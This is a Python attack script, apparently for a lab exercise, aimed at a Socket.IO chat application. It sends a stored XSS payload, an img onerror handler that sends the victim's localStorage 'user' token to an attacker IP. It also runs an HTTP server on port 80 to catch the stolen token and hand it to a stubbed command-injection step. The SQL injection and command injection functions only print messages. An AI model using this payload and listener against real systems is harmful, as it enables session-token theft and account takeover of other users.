import threading
import requests
import json
import socketio
import socket
import logging
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

cookie_received = False
# Custom session for proxy
class ProxySession(requests.Session):
    def __init__(self):
        super().__init__()
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }

# Initialize the Socket.IO client
sio = socketio.Client(http_session=ProxySession(), logger=True, engineio_logger=True)

def send_websocket_message():
    print("Registration data sent")
    print("[!] Script started Time-Based SQL Injection!")

def xxs():
    # XSS payload to steal the cookie
    sio.emit('<>', {
        "username": "test",
        "msg":'<img src=x onerror=this.src="http://192.168.45.152/?c="+localStorage.getItem("user")>'
    })
    print("[*] XSS Payload Sent!")


# WebSocket connection events
@sio.event
def connect():
    print("[*] Connected to the server")
    xxs()
    server()
    global token

@sio.event
def disconnect():
    logging.info("[*] Disconnected from the server")


# HTTP server to catch the stolen cookie
class CookieLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)
        global cookie_received
        global token

        if 'c' in query:
            stolen_cookie = query['c'][0]
            token_dict = json.loads(stolen_cookie)
            token = token_dict["token"]
            print(f"[!] Stolen cookie is: {token} ")
            cookie_received = True
            token = token


        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"c received and logged.")
        return

def run_http_server():
    server_address = ('', 80)
    httpd = HTTPServer(server_address, CookieLogger)
    print(f'[*] Starting HTTP server on port 80 to catch cookies...')
    global cookie_received
    global token
    while not cookie_received:
        httpd.handle_request()
    print("got the cookie")
    print(token)
    command_injection(token)

def command_injection(token):
    print("[!] injcetion sent")

def server():
    http_thread = threading.Thread(target=run_http_server)
    http_thread.daemon = True  # Set daemon mode so it exits when the main program exits
    http_thread.start()
if __name__ == '__main__':
    try:
        sio.connect("http://<url>", transports=['websocket', 'polling'])
        sio.wait()
    except KeyboardInterrupt:
        logging.info("[*] Exiting...")
    finally:
        sio.disconnect()

